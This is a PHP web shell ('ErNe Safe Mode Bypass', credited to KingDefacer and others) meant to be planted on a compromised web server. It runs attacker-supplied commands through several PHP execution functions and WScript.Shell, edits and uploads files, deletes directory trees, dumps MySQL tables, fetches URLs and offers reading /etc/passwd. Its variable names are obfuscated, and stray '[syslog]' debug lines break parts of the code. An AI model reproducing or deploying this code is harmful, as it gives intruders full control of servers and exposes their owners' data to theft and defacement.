<?php
?>
<tr><td><center><font size="4" color="#FFFFFF"><span style="background-color: #000000">ErNe Safe Mode Bypass - Edited By KingDefacer</span>
</font></center></td></tr></table>
<style type="text/css">
body,td {
	font-family: "Tahoma";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "Tahoma";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: 1px solid #666666 none;
	padding-left: "2px"
}
.redfont {
	COLOR: "#D0D0D0";
}
a:link,a:visited,a:active {
	color: "#9C9C9C";
	text-decoration: underline;
}
a:hover {
	color: "#FFFFFF";
	text-decoration: none;
}
.top {BACKGROUND-COLOR: "#D0D0D0"}
.firstalt {BACKGROUND-COLOR: "#000000"}
.secondalt {BACKGROUND-COLOR: "#000000"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
echo "[syslog]01\n";
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT></head><body><center>
<hr width="775" noshade><table width="775" border="0" cellpadding="0">
<?php  echo '[syslog]02
'; error_reporting(7); ob_start(); $sp18e70c = explode(' ', microtime()); $spe4271b = $sp18e70c[1] + $sp18e70c[0]; $spd4a5e9 = function_exists('ini_get') ? ini_get('register_globals') : 'true'; if ($spd4a5e9 != 1) { @extract($_POST, EXTR_SKIP); @extract($_GET, EXTR_SKIP); } $sp2ae5cd = getcwd(); $spa5bde5 = $_SERVER['PHP_SELF']; $sp4c12e2 = 'true'; $sp011c8f = 'no'; $sp381623 = 'localhost'; $sp0d9cc6 = 'shellci_user'; $spb4fd46 = 'shellci_pass'; $sp164cc8 = 'shellci_db'; if (get_magic_quotes_gpc()) { $_GET = stripslashes_array($_GET); $_POST = stripslashes_array($_POST); } echo '[syslog]03
'; if (empty($_POST['phpinfo'])) { } else { echo $sp00fce8 = !eregi('phpinfo', $sp4c12e2) ? phpinfo() : 'phpinfo()'; die; } if (isset($_POST['url'])) { $sp29173a = @file_get_contents($_POST['url']); echo $sp29173a ? $sp29173a : '<body bgcolor="#F5F5F5" style="font-size: 12px;"><center><br><p><b>?�?????? URL ?�?????�???�?�?�</b></p></center></body>'; die; } if (empty($_POST['erne'])) { } else { $spd2ab61 = '?action=erne'; echo '<table Width=\'100%\' height=\'10%\' bgcolor=\'#000000\' border=\'1\'><tr><td><center><font size=\'6\' color=\'#D0D0D0\'>
Powered By Erne, KingDefacer, Ekin0x, Mohajer22, Ja ( Turkey, Suudi Iraq )<br><br>'; echo '</font></center></td></tr></table> '; die; } if (empty($_POST['command'])) { } else { if (substr(PHP_OS, 0, 3) == 'WIN') { $spa50437 = isset($_POST['program']) ? $_POST['program'] : 'c:\\winnt\\system32\\cmd.exe'; $spe1ed9d = isset($_POST['prog']) ? $_POST['prog'] : '/c net start > ' . $sp5ff7b9 . '/log.txt'; echo '</form>
'; } $spda3331 = new FORMS(); $spda3331->tableheader(); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>' . $_SERVER['HTTP_HOST'] . '</b></td><td><b>' . $sp2ae5cd . '</b></td><td align="right"><b>' . $_SERVER['REMOTE_ADDR'] . '</b></td></tr></table>', 'center', 'top'); $spda3331->tdbody("<FORM method='POST' action='{$sp7e9961}' enctype='multipart/form-data'><INPUT type='submit' name='Rifrish' value='  dir  '  id=input><INPUT type='submit'name='erne' value='ernealizm'  id=input><INPUT type='submit' name='phpinfo' value='PHPinfo' id=input><INPUT type='submit' name='shell' value='command shill' id=input></form>"); $spda3331->tablefooter(); $spda3331->tableheader(); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>command [ system , shell_exec , passthru , Wscript.Shell , exec , popen ]</b></td></tr></table>', 'center', 'top'); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); $sp98f925 = substr(PHP_OS, 0, 3) == 'WIN' ? array('system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen', 'wscript' => 'Wscript.Shell') : array('system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen'); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>cmd:</FONT>' . $spda3331->makeselect(array('name' => 'execfunc', 'option' => $sp98f925, 'selected' => $sp5f2522)) . ' ' . $spda3331->makeinput('command') . ' ' . $spda3331->makeinput('Run', 'command', '', 'submit'))); echo '<tr class=\'secondalt\'><td align=\'center\'><textarea name=\'textarea\' cols=\'100\' rows=\'25\' readonly>'; if ($_POST['command']) { if ($sp5f2522 == 'system') { system($_POST['command']); } elseif ($sp5f2522 == 'passthru') { passthru($_POST['command']); } elseif ($sp5f2522 == 'exec') { $spea30d5 = exec($_POST['command']); echo $spea30d5; } elseif ($sp5f2522 == 'shell_exec') { $spea30d5 = shell_exec($_POST['command']); echo $spea30d5; } elseif ($sp5f2522 == 'popen') { $sp41ba56 = popen($_POST['command'], 'r'); $sp437738 = fread($sp41ba56, 2096); echo $sp437738; pclose($sp41ba56); } elseif ($sp5f2522 == 'wscript') { $spd900a8 = new COM('W' . 'Scr' . 'ip' . 't.she' . 'll') or die('PHP Create COM WSHSHELL failed'); $spd40066 = $spd900a8->exec('cm' . 'd.e' . 'xe /c ' . $_POST['command'] . ''); $sp502d2e = $spd40066->StdOut(); $spce0a4e = $sp502d2e->ReadAll(); echo $spce0a4e; } else { system($_POST['command']); } } echo '</textarea></td></tr></form></table>'; die; } echo '[syslog]04
'; if ($_POST['editfile']) { $sp694629 = fopen($_POST['editfile'], 'r'); $sp14cb07 = file($_POST['editfile']); foreach ($sp14cb07 as $sp5ecd68) { $sp1c78b4 = $sp1c78b4 . $sp5ecd68; } echo "<center><div id=logostrip>Edit file: {$spaaa182} </div><form action='{$sp7e9961}' method='POST'><textarea name=content cols=122 rows=20>"; echo htmlentities($sp1c78b4); echo '</textarea>'; echo '<input type=\'hidden\' name=\'dir\' value=\'' . getcwd() . "'>\n<input type='hidden' name='savefile' value='{$_POST['editfile']}'><br>\n<input type='submit' name='submit' value='Save'></form></center>"; fclose($sp694629); } if ($_POST['savefile']) { $sp694629 = fopen($_POST['savefile'], 'w'); $sp1c78b4 = stripslashes($sp1c78b4); fwrite($sp694629, $sp1c78b4); fclose($sp694629); echo '<center><div id=logostrip>Successfully saved!</div></center>'; } if ($spef0b4a) { echo @copy($_FILES['uploadfile']['tmp_name'], '' . $spe338c5 . '/' . $_FILES['uploadfile']['name'] . '') ? '?�???�?�?�?�?��?�!' : '?�???�?�???�?�?�!'; } elseif ($sp0bef3d and !empty($_POST['newdirectory'])) { if (!empty($sp6fdfdb)) { $sp1d0a7c = "{$spa25e24}/{$sp6fdfdb}"; if (file_exists("{$sp1d0a7c}")) { echo 'can\'t make dir'; } else { echo @mkdir("{$sp1d0a7c}", 511) ? 'ok' : ''; @chmod("{$sp1d0a7c}", 511); } } } $sp5ff7b9 = str_replace('\\', '/', dirname(__FILE__)); if (!isset($spa25e24) or empty($spa25e24)) { $spa25e24 = '.'; $sp43bee6 = getPath($sp5ff7b9, $spa25e24); } else { $spa25e24 = $sp72be29['dir']; $sp43bee6 = getPath($sp5ff7b9, $spa25e24); } echo '[syslog]05
'; $spe76b78 = dir_writeable($sp43bee6) ? 'm' : 'mm'; $sp00fce8 = !eregi('phpinfo', $sp4c12e2) ? ' | <a href="?action=phpinfo" target="_blank">PHPINFO()</a>' : ''; $sp09f751 = substr(PHP_OS, 0, 3) == 'WIN' ? ' | <a href="?action=reg"mohajer22</a>' : ''; $spda3331 = new FORMS(); $spda3331->tableheader(); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>' . $_SERVER['HTTP_HOST'] . '</b></td><td><b>' . $sp2ae5cd . '</b></td><td align="right"><b>' . $_SERVER['REMOTE_ADDR'] . '</b></td></tr></table>', 'center', 'top'); $spda3331->tdbody("<FORM method='POST' action='{$sp7e9961}' enctype='multipart/form-data'><INPUT type='submit' name='Rifrish' value='  dir  '  id=input><INPUT type='submit'name='erne' value='erne '  id=input><INPUT type='submit' name='phpinfo' value='PHPinfo' id=input><INPUT type='submit' name='shell' value='command shill' id=input></form>"); $spda3331->tablefooter(); $spda3331->tableheader(); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Dosya Duzenle Yada Olustur & Dosya Yukle & Dizin Olustur</b></td></tr></table>', 'center', 'top'); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>Dosya Duzenle weya Olustur:</FONT>' . $spda3331->makehidden('dir', getcwd()) . ' ' . $spda3331->makeinput('editfile') . ' ' . $spda3331->makeinput('Edit', 'Duzenle', '', 'submit'))); $spda3331->headerform(array('action' => '?dir=' . urlencode($spa25e24), 'enctype' => 'multipart/form-data', 'content' => '<FONT COLOR=#9C9C9C>Dosya Yukle:</FONT>' . $spda3331->makeinput('uploadfile', '', '', 'file') . ' ' . $spda3331->makeinput('doupfile', 'Ekle', '', 'submit') . $spda3331->makeinput('uploaddir', $spa25e24, '', 'hidden'))); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>Dizin Olustur:</FONT> ' . $spda3331->makeinput('newdirectory') . ' ' . $spda3331->makeinput('createdirectory', 'yenidizin', '', 'submit'))); $sp98f925 = substr(PHP_OS, 0, 3) == 'WIN' ? array('system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen', 'wscript' => 'Wscript.Shell') : array('system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen'); $spda3331->headerform(array('content' => '<FONT COLOR=#9C9C9C>cmd:</FONT>' . $spda3331->makeselect(array('name' => 'execfunc', 'option' => $sp98f925, 'selected' => $sp5f2522)) . ' ' . $spda3331->makeinput('command') . ' ' . $spda3331->makeinput('Run', 'command', '', 'submit'))); $spda3331->tdbody('</td></tr></table>'); if (!isset($_GET['action']) or empty($_GET['action']) or $_GET['action'] == 'dir') { $spda3331->tableheader(); echo '<tr bgcolor=\'#D0D0D0\'><td align=\'center\' nowrap width=\'27%\'><b>DIR</b></td><td align=\'center\' nowrap width=\'16%\'><b>First data</b></td><td align=\'center\' nowrap width=\'16%\'><b>Last data</b></td><td align=\'center\' nowrap width=\'11%\'><b>Size</b></td><td align=\'center\' nowrap width=\'6%\'><b>Perm</b></td></tr>'; $sp0f92f5 = @opendir($spa25e24); $spc6af21 = '0'; while ($spa3ecf0 = @readdir($sp0f92f5)) { $spcc8ef6 = "{$spa25e24}/{$spa3ecf0}"; $sp5955cc = @is_dir($spcc8ef6); if ($sp5955cc == '1') { if ($spa3ecf0 != '..' && $spa3ecf0 != '.') { $sp8ea8cb = @date('Y-m-d H:i:s', @filectime($spcc8ef6)); $sp18e70c = @date('Y-m-d H:i:s', @filemtime($spcc8ef6)); $spd89e38 = substr(base_convert(fileperms($spcc8ef6), 10, 8), -4); echo '<tr class=' . getrowbg() . '>
'; echo '  <td style="padding-left: 5px;">[<a href="?dir=' . urlencode($spa25e24) . '/' . urlencode($spa3ecf0) . "\"><font color=\"#006699\">{$spa3ecf0}</font></a>]</td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp8ea8cb}</span></td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp18e70c}</span></td>\n"; echo '  <td align="center" nowrap class="smlfont"><span class="redfont">&lt;dir&gt;</span></td>
'; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$spd89e38}</span></td>\n"; echo '</tr>
'; $spc6af21++; } else { if ($spa3ecf0 == '..') { echo '<tr class=' . getrowbg() . '>
'; echo '  <td nowrap colspan="6" style="padding-left: 5px;"><a href="?dir=' . urlencode($spa25e24) . '/' . urlencode($spa3ecf0) . '">Up dir</a></td>
'; echo '</tr>
'; } } } } @closedir($sp0f92f5); echo '<tr bgcolor=\'#cccccc\'><td colspan=\'6\' height=\'5\'></td></tr><FORM  method=\'POST\'>'; echo '[syslog]06
'; $sp0f92f5 = @opendir($spa25e24); $sp8e3ab7 = '0'; while ($spa3ecf0 = @readdir($sp0f92f5)) { $spcc8ef6 = "{$spa25e24}/{$spa3ecf0}"; $sp5955cc = @is_dir($spcc8ef6); if ($sp5955cc == '0') { $sp92ea66 = @filesize($spcc8ef6); $sp92ea66 = $sp92ea66 / 1024; $sp92ea66 = @number_format($sp92ea66, 3); if (@filectime($spcc8ef6) == @filemtime($spcc8ef6)) { $sp8ea8cb = @date('Y-m-d H:i:s', @filectime($spcc8ef6)); $sp18e70c = @date('Y-m-d H:i:s', @filemtime($spcc8ef6)); } else { $sp8ea8cb = '<span class="redfont">' . @date('Y-m-d H:i:s', @filectime($spcc8ef6)) . '</span>'; $sp18e70c = '<span class="redfont">' . @date('Y-m-d H:i:s', @filemtime($spcc8ef6)) . '</span>'; } @($sp9d5095 = substr(base_convert(@fileperms($spcc8ef6), 10, 8), -4)); echo '<tr class=' . getrowbg() . '>
'; echo '  <td style="padding-left: 5px;">'; echo "<INPUT type=checkbox value=1 name=dl[{$spcc8ef6}]>"; echo "<a href=\"{$spcc8ef6}\" target=\"_blank\">{$spa3ecf0}</a></td>\n"; if ($spa3ecf0 == 'config.php') { echo "<a href=\"{$spcc8ef6}\" target=\"_blank\"><font color='yellow'>{$spa3ecf0}<STRONG></STRONG></a></td>\n"; } echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp8ea8cb}</span></td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp18e70c}</span></td>\n"; echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp92ea66}</span> KB</td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp9d5095}</span></td>\n"; echo '</tr>
'; $sp8e3ab7++; } } @closedir($sp0f92f5); echo '</FORM>
'; echo '</table>
'; } function debuginfo() { global $spe4271b; $sp18e70c = explode(' ', microtime()); $spc2c02d = number_format($sp18e70c[1] + $sp18e70c[0] - $spe4271b, 6); echo "Processed in {$spc2c02d} second(s)"; } function stripslashes_array(&$sp6dfc07) { while (list($sp8b00ef, $spa2fb2f) = each($sp6dfc07)) { if ($sp8b00ef != 'argc' && $sp8b00ef != 'argv' && (strtoupper($sp8b00ef) != $sp8b00ef || '' . intval($sp8b00ef) == "{$sp8b00ef}")) { if (is_string($spa2fb2f)) { $sp6dfc07[$sp8b00ef] = stripslashes($spa2fb2f); } if (is_array($spa2fb2f)) { $sp6dfc07[$sp8b00ef] = stripslashes_array($spa2fb2f); } } } return $sp6dfc07; } function deltree($sp712bfd) { $spff8269 = @dir($sp712bfd); while ($spa3ecf0 = $spff8269->read()) { if (is_dir("{$sp712bfd}/{$spa3ecf0}") and $spa3ecf0 != '.' and $spa3ecf0 != '..') { @chmod("{$sp712bfd}/{$spa3ecf0}", 511); deltree("{$sp712bfd}/{$spa3ecf0}"); } if (is_file("{$sp712bfd}/{$spa3ecf0}")) { @chmod("{$sp712bfd}/{$spa3ecf0}", 511); @unlink("{$sp712bfd}/{$spa3ecf0}"); } } $spff8269->close(); @chmod("{$sp712bfd}", 511); return @rmdir($sp712bfd) ? 1 : 0; } function dir_writeable($spa25e24) { if (!is_dir($spa25e24)) { @mkdir($spa25e24, 511); } if (is_dir($spa25e24)) { if ($sp694629 = @fopen("{$spa25e24}/test.txt", 'w')) { @fclose($sp694629); @unlink("{$spa25e24}/test.txt"); $sp21529d = 1; } else { $sp21529d = 0; } } return $sp21529d; } function getrowbg() { global $sp97c139; if ($sp97c139++ % 2 == 0) { return 'firstalt'; } else { return 'secondalt'; } } function getPath($spb8c475, $sp942ed5) { global $spa25e24; $sp5f588e = explode('/', $spb8c475); $sp451665 = explode('/', $sp942ed5); $spf383f7 = count($sp451665); for ($sp6c3e91 = 0; $sp6c3e91 < $spf383f7; $sp6c3e91++) { if ($sp451665[$sp6c3e91] == '.' || $sp451665[$sp6c3e91] == '') { continue; } if ($sp451665[$sp6c3e91] == '..') { $spa2cebd = count($sp5f588e); unset($sp5f588e[$spa2cebd - 1]); continue; } $sp5f588e[count($sp5f588e)] = $sp451665[$sp6c3e91]; } return implode('/', $sp5f588e); } function getphpcfg($sp3f18f5) { switch ($spea30d5 = 'true') { case 0: return 'No'; break; case 1: return 'Yes'; break; default: return $spea30d5; break; } } function getfun($sp1c08ae) { return false !== function_exists($sp1c08ae) ? 'Yes' : 'No'; } class PHPZip { var $out = ''; function PHPZip($spa25e24) { if (@function_exists('gzcompress')) { $sp07714d = getcwd(); if (is_array($spa25e24)) { $sp225924 = $spa25e24; } else { $sp225924 = $this->GetFileList($spa25e24); foreach ($sp225924 as $sp71a197 => $spe2ff4f) { $sp225924[] = substr($spe2ff4f, strlen($spa25e24) + 1); } } if (!empty($spa25e24) && !is_array($spa25e24) && file_exists($spa25e24)) { chdir($spa25e24); } else { chdir($sp07714d); } if (count($sp225924) > 0) { foreach ($sp225924 as $spbc6552) { if (is_file($spbc6552)) { $sp6ec574 = fopen($spbc6552, 'r'); $sp1c78b4 = @fread($sp6ec574, filesize($spbc6552)); fclose($sp6ec574); if (is_array($spa25e24)) { $spbc6552 = basename($spbc6552); } $this->addFile($sp1c78b4, $spbc6552); } } $this->out = $this->file(); chdir($sp07714d); } return 1; } else { return 0; } } function GetFileList($spa25e24) { static $sp5955cc; if (is_dir($spa25e24)) { if ($sp232d7c = opendir($spa25e24)) { while (($spa3ecf0 = readdir($sp232d7c)) !== false) { if ($spa3ecf0 != '.' && $spa3ecf0 != '..') { $sp224638 = $spa25e24 . '/' . $spa3ecf0; if (is_dir($sp224638)) { $this->GetFileList($sp224638); } $sp5955cc[] = $sp224638; } } closedir($sp232d7c); } } return $sp5955cc; } var $datasec = array(); var $ctrl_dir = array(); var $eof_ctrl_dir = 'PK    '; var $old_offset = 0; function unix2DosTime($sp27f7d7 = 0) { $sp5283e0 = $sp27f7d7 == 0 ? getdate() : getdate($sp27f7d7); if ($sp5283e0['year'] < 1980) { $sp5283e0['year'] = 1980; $sp5283e0['mon'] = 1; $sp5283e0['mday'] = 1; $sp5283e0['hours'] = 0; $sp5283e0['minutes'] = 0; $sp5283e0['seconds'] = 0; } return $sp5283e0['year'] - 1980 << 25 | $sp5283e0['mon'] << 21 | $sp5283e0['mday'] << 16 | $sp5283e0['hours'] << 11 | $sp5283e0['minutes'] << 5 | $sp5283e0['seconds'] >> 1; } function addFile($spabbf84, $sp19dd0c, $spdec3d1 = 0) { $sp19dd0c = str_replace('\\', '/', $sp19dd0c); $spa78cc1 = dechex($this->unix2DosTime($spdec3d1)); $spd7a397 = '\\x' . $spa78cc1[6] . $spa78cc1[7] . '\\x' . $spa78cc1[4] . $spa78cc1[5] . '\\x' . $spa78cc1[2] . $spa78cc1[3] . '\\x' . $spa78cc1[0] . $spa78cc1[1]; eval('$hexdtime = "' . $spd7a397 . '";'); $sp84051f = 'PK'; $sp84051f .= ' '; $sp84051f .= '  '; $sp84051f .= ' '; $sp84051f .= $spd7a397; $sp2cc504 = strlen($spabbf84); $sp5e852c = crc32($spabbf84); $spb4ecf6 = gzcompress($spabbf84); $sp2ca0b2 = strlen($spb4ecf6); $spb4ecf6 = substr(substr($spb4ecf6, 0, strlen($spb4ecf6) - 4), 2); $sp84051f .= pack('V', $sp5e852c); $sp84051f .= pack('V', $sp2ca0b2); $sp84051f .= pack('V', $sp2cc504); $sp84051f .= pack('v', strlen($sp19dd0c)); $sp84051f .= pack('v', 0); $sp84051f .= $sp19dd0c; $sp84051f .= $spb4ecf6; $sp84051f .= pack('V', $sp5e852c); $sp84051f .= pack('V', $sp2ca0b2); $sp84051f .= pack('V', $sp2cc504); $this->datasec[] = $sp84051f; $sp103956 = strlen(implode('', $this->datasec)); $sp92ebdf = 'PK'; $sp92ebdf .= '  '; $sp92ebdf .= ' '; $sp92ebdf .= '  '; $sp92ebdf .= ' '; $sp92ebdf .= $spd7a397; $sp92ebdf .= pack('V', $sp5e852c); $sp92ebdf .= pack('V', $sp2ca0b2); $sp92ebdf .= pack('V', $sp2cc504); $sp92ebdf .= pack('v', strlen($sp19dd0c)); $sp92ebdf .= pack('v', 0); $sp92ebdf .= pack('v', 0); $sp92ebdf .= pack('v', 0); $sp92ebdf .= pack('v', 0); $sp92ebdf .= pack('V', 32); $sp92ebdf .= pack('V', $this->old_offset); $this->old_offset = $sp103956; $sp92ebdf .= $sp19dd0c; $this->ctrl_dir[] = $sp92ebdf; } function file() { $spabbf84 = implode('', $this->datasec); $sp438bb4 = implode('', $this->ctrl_dir); return $spabbf84 . $sp438bb4 . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($sp438bb4)) . pack('V', strlen($spabbf84)) . '  '; } } function sqldumptable($sp4297b3, $sp694629 = 0) { $sp1cceb8 = "DROP TABLE IF EXISTS {$sp4297b3};\n"; $sp1cceb8 .= "CREATE TABLE {$sp4297b3} (\n"; $sp0baa35 = 1; $sp9e6a11 = mysql_query("SHOW FIELDS FROM {$sp4297b3}"); while ($spb5262f = mysql_fetch_array($sp9e6a11)) { if (!$sp0baa35) { $sp1cceb8 .= ',
'; } else { $sp0baa35 = 0; } $sp1cceb8 .= "   {$spb5262f['Field']} {$spb5262f['Type']}"; if (!empty($spb5262f['Default'])) { $sp1cceb8 .= " DEFAULT '{$spb5262f['Default']}'"; } if ($spb5262f['Null'] != 'YES') { $sp1cceb8 .= ' NOT NULL'; } if ($spb5262f['Extra'] != '') { $sp1cceb8 .= " {$spb5262f['Extra']}"; } } mysql_free_result($sp9e6a11); $spa22ace = mysql_query("SHOW KEYS FROM {$sp4297b3}"); while ($sp8b00ef = mysql_fetch_array($spa22ace)) { $sp5fd4dd = $sp8b00ef['Key_name']; if ($sp5fd4dd != 'PRIMARY' and $sp8b00ef['Non_unique'] == 0) { $sp5fd4dd = "UNIQUE|{$sp5fd4dd}"; } if (!is_array($spe2a956[$sp5fd4dd])) { $spe2a956[$sp5fd4dd] = array(); } $spe2a956[$sp5fd4dd][] = $sp8b00ef['Column_name']; } mysql_free_result($spa22ace); while (list($sp5fd4dd, $sp98a32a) = @each($spe2a956)) { $sp1cceb8 .= ',
'; $sp773f55 = implode($sp98a32a, ','); if ($sp5fd4dd == 'PRIMARY') { $sp1cceb8 .= "   PRIMARY KEY ({$sp773f55})"; } else { if (substr($sp5fd4dd, 0, 6) == 'UNIQUE') { $sp5fd4dd = substr($sp5fd4dd, 7); } $sp1cceb8 .= "   KEY {$sp5fd4dd} ({$sp773f55})"; } } $sp1cceb8 .= '
);

'; if ($sp694629) { fwrite($sp694629, $sp1cceb8); } else { echo $sp1cceb8; } $spb7d784 = mysql_query("SELECT * FROM {$sp4297b3}"); $spe92b26 = mysql_num_fields($spb7d784); while ($spa53ce4 = mysql_fetch_array($spb7d784)) { $sp1cceb8 = "INSERT INTO {$sp4297b3} VALUES("; $sp9b86f4 = -1; $sp0baa35 = 1; while (++$sp9b86f4 < $spe92b26) { if (!$sp0baa35) { $sp1cceb8 .= ', '; } else { $sp0baa35 = 0; } if (!isset($spa53ce4[$sp9b86f4])) { $sp1cceb8 .= 'NULL'; } else { $sp1cceb8 .= '\'' . mysql_escape_string($spa53ce4[$sp9b86f4]) . '\''; } } $sp1cceb8 .= ');
'; if ($sp694629) { fwrite($sp694629, $sp1cceb8); } else { echo $sp1cceb8; } } mysql_free_result($spb7d784); } class FORMS { function tableheader() { echo '<table width="775" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
'; } function headerform($spab949a = array()) { global $spa25e24; if ($spab949a[enctype]) { $sp5089df = "enctype=\"{$spab949a['enctype']}\""; } else { $sp5089df = ''; } if (!isset($spab949a[method])) { $spab949a[method] = 'POST'; } if (!isset($spab949a[action])) { $spab949a[action] = ''; } echo '  <form action="' . $spab949a[action] . '" method="' . $spab949a[method] . "\" {$sp5089df}>\n"; echo '  <tr>
'; echo '    <td>' . $spab949a[content] . '</td>
'; echo '  </tr>
'; echo '  </form>
'; } function tdheader($spd5a4bf) { global $spa25e24; echo '  <tr class="firstalt">
'; echo '	<td align="center"><b>' . $spd5a4bf . ' [<a href="?dir=' . urlencode($spa25e24) . '">?�mohajer</a>]</b></td>
'; echo '  </tr>
'; } function tdbody($sp1c78b4, $spd022b9 = 'center', $sp96e2ff = '2', $sp164ad9 = '', $sp5ac5ca = '', $spdea646 = '') { if ($sp96e2ff == '2') { $sp2ee2ee = 'secondalt'; } elseif ($sp96e2ff == '1') { $sp2ee2ee = 'firstalt'; } else { $sp2ee2ee = $sp96e2ff; } $sp164ad9 = empty($sp164ad9) ? '' : ' height=' . $sp164ad9; $spdea646 = empty($spdea646) ? '' : ' colspan=' . $spdea646; echo '  <tr class="' . $sp2ee2ee . '">
'; echo '	<td align="' . $spd022b9 . '"' . $sp164ad9 . ' ' . $spdea646 . ' ' . $sp5ac5ca . '>' . $sp1c78b4 . '</td>
'; echo '  </tr>
'; } function tablefooter() { echo '</table>
'; } function formheader($spd2ab61 = '', $spd5a4bf, $sp262d98 = '') { global $spa25e24; $sp262d98 = empty($sp262d98) ? '' : ' target="' . $sp262d98 . '"'; echo " <form action=\"{$spd2ab61}\" method=\"POST\"" . $sp262d98 . '>
'; echo '  <tr class="firstalt">
'; echo '	<td align="center"><b>' . $spd5a4bf . ' [<a href="?dir=' . urlencode($spa25e24) . '">?�?�?�??</a>]</b></td>
'; echo '  </tr>
'; } function makehidden($sp19dd0c, $spc3da4d = '') { echo "<input type=\"hidden\" name=\"{$sp19dd0c}\" value=\"{$spc3da4d}\">\n"; } function makeinput($sp19dd0c, $spc3da4d = '', $sp5ac5ca = '', $spb06e63 = 'text', $sp92ea66 = '30', $sp2ee2ee = 'input') { $sp2ee2ee = $sp2ee2ee == 'input' ? ' class="input"' : ''; $sp47e3ed = "<input name=\"{$sp19dd0c}\" value=\"{$spc3da4d}\" type=\"{$spb06e63}\" " . $sp2ee2ee . " size=\"{$sp92ea66}\" {$sp5ac5ca}>\n"; return $sp47e3ed; } function makeid($sp19dd0c, $spc3da4d = '', $sp5ac5ca = '', $spb06e63 = 'select', $sp92ea66 = '30', $sp2ee2ee = 'input') { $sp2ee2ee = $sp2ee2ee == 'input' ? ' class="input"' : ''; $sp47e3ed = '<select name=plugin><option>cat /etc/passwd</option></select>'; return $sp47e3ed; } function makeimp($sp19dd0c, $spc3da4d = '', $sp5ac5ca = '', $spb06e63 = 'select', $sp92ea66 = '30', $sp2ee2ee = 'input') { $sp2ee2ee = $sp2ee2ee == 'input' ? ' class="input"' : ''; $sp47e3ed = '<select name=switch><option value=file>View file</option><option value=dir>View dir</option></select>'; return $sp47e3ed; } function maketextarea($sp19dd0c, $sp1c78b4 = '', $sp5aa8ea = '100', $spb7d784 = '20', $sp5ac5ca = '') { $spf81d2c = '<textarea name="' . $sp19dd0c . '" cols="' . $sp5aa8ea . '" rows="' . $spb7d784 . '" ' . $sp5ac5ca . '>' . $sp1c78b4 . '</textarea>
'; return $spf81d2c; } function formfooter($sp53010b = '', $sp164ad9 = '') { $sp164ad9 = empty($sp164ad9) ? '' : ' height="' . $sp164ad9 . '"'; echo '  <tr class="secondalt">
'; echo '	<td align="center"' . $sp164ad9 . '><input class="input" type="submit" value=\'mohajer\'></td>
'; echo '  </tr>
'; echo ' </form>
'; echo $sp881055 = empty($sp53010b) ? '' : '</table>
'; } function makeselect($spab949a = array()) { if ($spab949a[multiple] == 1) { $sp650da6 = ' multiple'; if ($spab949a[size] > 0) { $sp92ea66 = "size={$spab949a['size']}"; } } if ($spab949a[css] == 0) { $sp2ee2ee = 'class="input"'; } $sp4bd588 = "<select {$sp2ee2ee} name=\"{$spab949a['name']}\"{$sp650da6} {$sp92ea66}>\n"; if (is_array($spab949a[option])) { foreach ($spab949a[option] as $sp8b00ef => $spc3da4d) { if (!is_array($spab949a[selected])) { if ($spab949a[selected] == $sp8b00ef) { $sp4bd588 .= "<option value=\"{$sp8b00ef}\" selected>{$spc3da4d}</option>\n"; } else { $sp4bd588 .= "<option value=\"{$sp8b00ef}\">{$spc3da4d}</option>\n"; } } elseif (is_array($spab949a[selected])) { if ($spab949a[selected][$sp8b00ef] == 1) { $sp4bd588 .= "<option value=\"{$sp8b00ef}\" selected>{$spc3da4d}</option>\n"; } else { $sp4bd588 .= "<option value=\"{$sp8b00ef}\">{$spc3da4d}</option>\n"; } } } } $sp4bd588 .= '</select>
'; return $sp4bd588; } } $spda3331->tableheader(); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: read file [SQL , id , CURL , copy , ini_restore , imap]    & Make file ERORR</b></td></tr></table>', 'center', 'top'); $spda3331->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); echo '[syslog]07
